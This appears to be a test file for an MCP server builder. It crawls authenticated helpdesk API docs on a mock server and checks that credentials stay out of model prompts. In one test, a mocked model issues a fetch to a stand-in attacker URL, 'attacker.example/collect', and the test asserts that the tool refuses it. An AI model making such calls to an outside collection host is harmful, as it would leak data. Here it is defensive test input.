import { chatReply, gateway, MODEL, resetGateway } from "./support/gateway-harness";
import { recordedPrisma } from "./support/recorded-prisma";
import assert from "node:assert/strict";
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { after, before, test } from "node:test";
import { runAsPrincipal } from "@/lib/auth/delegation";
import { BUILDER_MODEL_KEY } from "@/schemas/mcp";
import type { AuthenticatedSession } from "@/types/auth";
import type { JsonMap } from "@/types/gateway";
import type { McpDraft } from "@/types/mcp";

const PASSWORD = "pw-SECRET-4d1e";
const SESSION = "sid-SECRET-77aa";
const BASIC = `Basic ${Buffer.from(`agent:${PASSWORD}`).toString("base64")}`;
const SECRETS = [PASSWORD, SESSION, BASIC.slice(6)];

let port = 0;
const requests: { path: string; authorization: string; cookie: string }[] = [];

function html(title: string, body: string): string {
  return `<!doctype html><html><head><title>${title}</title></head><body>
<nav><ul><li>Helpdesk docs</li><li>Tickets</li><li>Users</li><li>Sign out</li></ul></nav>
<main><h1>${title}</h1>${body}</main><footer><p>Example Helpdesk 2026</p></footer></body></html>`;
}

const PAGES: Record<string, string> = {
  "/docs/index.html": html(
    "Helpdesk REST API",
    `<p>All requests go to /api/v1 and use HTTP Basic authentication with an agent account.</p>
<ul><li><a href="tickets/index.html">Tickets</a></li><li><a href="users.html">Users</a></li>
<li><a href="logout">Sign out</a></li><li><a href="/blog/news.html">News</a></li></ul>`,
  ),
  "/docs/tickets/index.html": html(
    "Tickets",
    `<p>Tickets are the core resource.</p><a href="list.html">List tickets</a> <a href="create.html">Create a ticket</a> <a href="../users.html">Users</a>`,
  ),
  "/docs/tickets/list.html": html(
    "List tickets",
    "<p>GET /api/v1/tickets returns the tickets the agent can see.</p><table><tr><td>page</td><td>integer</td></tr><tr><td>per_page</td><td>integer</td></tr></table>",
  ),
  "/docs/tickets/create.html": html("Create a ticket", "<p>POST /api/v1/tickets creates a ticket from title, group, and customer.</p>"),
  "/docs/users.html": html("Users", "<p>GET /api/v1/users lists agents and customers.</p>"),
  "/docs/reference/delete.html": html("Delete a ticket", "<p>DELETE /api/v1/tickets/{id} removes a ticket for good.</p>"),
  "/docs/swagger.html": html("API explorer", '<redoc spec-url="/openapi.yaml"></redoc>'),
};

const YAML_SPEC = `openapi: 3.0.3
info:
  title: Helpdesk
servers:
  - url: /api/v1
components:
  securitySchemes:
    agent: { type: http, scheme: basic }
paths:
  /tickets:
    get:
      operationId: listTickets
      summary: List tickets
`;

function cookieOf(req: IncomingMessage): string {
  return String(req.headers.cookie ?? "");
}

const server: Server = createServer((req, res) => {
  const url = new URL(req.url ?? "/", "http://127.0.0.1");
  requests.push({ path: url.pathname, authorization: String(req.headers.authorization ?? ""), cookie: cookieOf(req) });
  const signedIn = cookieOf(req).includes(`sid=${SESSION}`);
  if (url.pathname === "/docs/index.html" || url.pathname === "/docs/swagger.html") {
    if (req.headers.authorization !== BASIC) {
      res.writeHead(401, { "www-authenticate": 'Basic realm="docs"' });
      res.end("sign in");
      return;
    }
    res.writeHead(200, { "content-type": "text/html", "set-cookie": `sid=${SESSION}; Path=/; HttpOnly` });
    res.end(PAGES[url.pathname]);
    return;
  }
  if (url.pathname === "/openapi.yaml" && req.headers.authorization === BASIC) {
    res.writeHead(200, { "content-type": "application/yaml" });
    res.end(YAML_SPEC);
    return;
  }
  const body = PAGES[url.pathname];
  if (body && signedIn) {
    res.writeHead(200, { "content-type": "text/html" });
    res.end(body);
    return;
  }
  if (body) {
    res.writeHead(302, { location: "/login" });
    res.end();
    return;
  }
  if (url.pathname === "/login") {
    res.writeHead(200, { "content-type": "text/html" });
    res.end('<html><body><form><input name="user"><input type="password" name="pw"></form></body></html>');
    return;
  }
  res.writeHead(404);
  res.end("missing");
});

before(async () => {
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  port = (server.address() as AddressInfo).port;
});

after(() => {
  server.close();
});

const manager: AuthenticatedSession = {
  error: false,
  sessionId: "",
  user: { id: "u1", username: "ops", email: "ops@example.com" } as AuthenticatedSession["user"],
  isOwner: false,
  role: null,
  permissions: ["settings:manage"],
  secondFactor: "MANAGEMENT_KEY",
  ipAddress: null,
  userAgent: null,
};

function draftJson(name: string, tools: { name: string; method: string; path: string }[]): string {
  return JSON.stringify({
    name,
    description: "Helpdesk tickets",
    baseUrl: `http://127.0.0.1:${port}/api/v1`,
    internal: true,
    authType: "basic",
    authHeader: "",
    notes: "",
    tools: tools.map((tool) => ({
      ...tool,
      title: tool.name,
      description: tool.name,
      action: tool.method === "GET" ? "read" : tool.method === "DELETE" ? "delete" : "write",
      query: [],
      inputSchema: { type: "object", properties: {} },
    })),
  });
}

function toolCallReply(calls: { name: string; args: JsonMap }[]): Response {
  return Response.json({
    id: "chatcmpl-tools",
    object: "chat.completion",
    created: 1,
    model: MODEL,
    choices: [
      {
        index: 0,
        message: {
          role: "assistant",
          content: null,
          tool_calls: calls.map((call, index) => ({
            id: `call_${index}`,
            type: "function",
            function: { name: call.name, arguments: JSON.stringify(call.args) },
          })),
        },
        finish_reason: "tool_calls",
      },
    ],
    usage: { prompt_tokens: 3, completion_tokens: 2, total_tokens: 5 },
  });
}

function prepare(reply: (body: JsonMap, call: number) => Response) {
  resetGateway();
  requests.length = 0;
  recordedPrisma.reset({
    setting: {
      findUnique: ({ where }: { where: { key: string } }) => (where.key === BUILDER_MODEL_KEY ? { key: where.key, value: MODEL } : null),
    },
  });
  let calls = 0;
  gateway.reply = (call) => {
    calls += 1;
    return reply(call.body ?? {}, calls);
  };
}

async function draft(raw: JsonMap): Promise<McpDraft> {
  const { draftMcpServer } = await import("@/lib/mcp/builder");
  return runAsPrincipal(manager, () => draftMcpServer(raw));
}

function docsLink(path: string): JsonMap {
  return { url: `http://127.0.0.1:${port}${path}`, internal: true, auth: "basic", name: "agent", secret: PASSWORD };
}

function messagesOf(index: number): JsonMap[] {
  return (gateway.upstream[index]!.body!.messages as JsonMap[]) ?? [];
}

function userText(index: number): string {
  const content = messagesOf(index)[1]!.content;
  return typeof content === "string" ? content : String((content as JsonMap[])[0]!.text);
}

function assertNoSecret(label: string, value: unknown) {
  const text = typeof value === "string" ? value : JSON.stringify(value);
  for (const secret of SECRETS) assert.equal(text.includes(secret), false, `${label} contains a credential`);
}

test("the builder crawls protected docs deeply, reads pages through tools, and keeps the login on the docs site", async () => {
  const base = `http://127.0.0.1:${port}`;
  prepare((body, call) => {
    if (call === 1) {
      const names = ((body.tools as JsonMap[]) ?? []).map((tool) => (tool.function as JsonMap).name);
      assert.deepEqual(names, ["list_pages", "read_page", "fetch_page"]);
      return toolCallReply([
        { name: "read_page", args: { url: `${base}/docs/tickets/list.html` } },
        { name: "fetch_page", args: { url: `${base}/docs/reference/delete.html` } },
        { name: "fetch_page", args: { url: "https://attacker.example/collect" } },
        { name: "list_pages", args: { filter: "tickets" } },
      ]);
    }
    return chatReply(
      draftJson("Helpdesk", [
        { name: "list_tickets", method: "GET", path: "/tickets" },
        { name: "create_ticket", method: "POST", path: "/tickets" },
        { name: "delete_ticket", method: "DELETE", path: "/tickets/{id}" },
        { name: "list_users", method: "GET", path: "/users" },
      ]),
    );
  });
  const result = await draft({ template: "full", instruction: "Build every operation.", links: [docsLink("/docs/index.html")] });
  assert.equal(result.source, "model");
  assert.deepEqual(
    result.tools.map((tool) => tool.name),
    ["list_tickets", "create_ticket", "delete_ticket", "list_users"],
  );
  assert.equal(gateway.upstream.length, 2);
  const prompt = userText(0);
  for (const path of ["/docs/index.html", "/docs/tickets/index.html", "/docs/tickets/list.html", "/docs/tickets/create.html", "/docs/users.html"]) {
    assert.ok(prompt.includes(`${base}${path}`), path);
  }
  assert.match(prompt, /Site index, 5 crawled pages/);
  assert.match(prompt, /POST \/api\/v1\/tickets creates a ticket/);
  assert.equal(prompt.split("Example Helpdesk 2026").length - 1, 1);
  const results = messagesOf(1).filter((message) => message.role === "tool").map((message) => String(message.content));
  assert.equal(results.length, 4);
  assert.match(results[0]!, /GET \/api\/v1\/tickets returns the tickets/);
  assert.match(results[1]!, /DELETE \/api\/v1\/tickets\/\{id\} removes a ticket/);
  assert.match(results[2]!, /^\[tool error\] Only pages on the site/);
  assert.match(results[3]!, /tickets\/list\.html/);
  assert.equal(messagesOf(1)[2]!.role, "assistant");
  assert.deepEqual(result.crawls, [
    { link: 0, url: `${base}/docs/index.html`, pages: 6, skipped: 1, failed: 0, truncated: null },
  ]);
  const paths = requests.map((request) => request.path);
  assert.equal(paths.includes("/docs/logout"), false);
  assert.equal(paths.includes("/blog/news.html"), false);
  assert.equal(paths.includes("/login"), false);
  for (const request of requests) {
    assert.equal(request.authorization, BASIC, request.path);
    if (request.path !== "/docs/index.html") assert.ok(request.cookie.includes(`sid=${SESSION}`), request.path);
  }
  assertNoSecret("model requests", gateway.upstream);
  assertNoSecret("draft", result);
});

test("a deployment that rejects tools gets the plain prompt instead", async () => {
  prepare((body) => {
    if (body.tools) return Response.json({ error: { message: "tools are not supported by this model", type: "invalid_request_error" } }, { status: 400 });
    return chatReply(draftJson("Helpdesk", [{ name: "list_tickets", method: "GET", path: "/tickets" }]));
  });
  const result = await draft({ template: "readonly", instruction: "Build the reads.", links: [docsLink("/docs/index.html")] });
  assert.deepEqual(
    result.tools.map((tool) => tool.name),
    ["list_tickets"],
  );
  const bodies = gateway.upstream.map((call) => call.body!);
  assert.equal(bodies.length, 3);
  assert.ok(bodies[0]!.tools && bodies[0]!.max_tokens);
  assert.ok(bodies[1]!.tools && !bodies[1]!.max_tokens);
  assert.ok(!bodies[2]!.tools && bodies[2]!.max_tokens);
  assert.match(userText(2), /GET \/api\/v1\/users lists agents/);
});

test("documentation longer than one prompt is drafted in passes whose tools are merged", async () => {
  const sections = Array.from({ length: 9_000 }, (_, index) => `## Endpoint ${index}\nGET /things/${index} returns thing number ${index}.`);
  const docs = sections.join("\n\n");
  assert.ok(docs.length > 400_000);
  const answers = [
    draftJson("Things", [{ name: "get_thing", method: "GET", path: "/things/{id}" }]),
    draftJson("Other name", [{ name: "list_things", method: "GET", path: "/things" }]),
    draftJson("Third", [
      { name: "get_thing", method: "GET", path: "/things/{id}" },
      { name: "create_thing", method: "POST", path: "/things" },
    ]),
  ];
  prepare((_body, call) => chatReply(answers[call - 1] ?? draftJson("Extra", [])));
  const result = await draft({ template: "full", instruction: "Build every operation.", docs });
  assert.equal(result.name, "Things");
  assert.deepEqual(
    result.tools.map((tool) => tool.name),
    ["get_thing", "list_things", "create_thing"],
  );
  assert.equal(result.passes, gateway.upstream.length);
  assert.equal(result.parts, gateway.upstream.length);
  assert.ok(result.parts >= 3);
  for (const call of gateway.upstream) assert.ok(userText(gateway.upstream.indexOf(call)).length < 200_000);
  assert.match(userText(0), new RegExp(`This is part 1 of ${result.parts}`));
  assert.match(userText(1), /These tools already exist from earlier parts: get_thing\./);
  assert.match(userText(1), /Endpoint \d+/);
  assert.equal(gateway.upstream.some((call) => Array.isArray(call.body?.tools)), false);
});

test("an OpenAPI document linked from protected docs pages takes the import path", async () => {
  prepare(() => chatReply("unused"));
  const result = await draft({ template: "readonly", instruction: "Build the reads.", links: [docsLink("/docs/swagger.html")] });
  assert.equal(result.source, "openapi");
  assert.equal(result.name, "Helpdesk");
  assert.equal(result.baseUrl, `http://127.0.0.1:${port}/api/v1`);
  assert.equal(result.authType, "basic");
  assert.deepEqual(result.importedFrom, { kind: "link", name: `127.0.0.1:${port}` });
  assert.deepEqual(result.unused, []);
  assert.equal(result.crawls[0]!.link, 0);
  assert.equal(gateway.upstream.length, 0);
  assert.equal(requests.find((request) => request.path === "/openapi.yaml")?.authorization, BASIC);
});
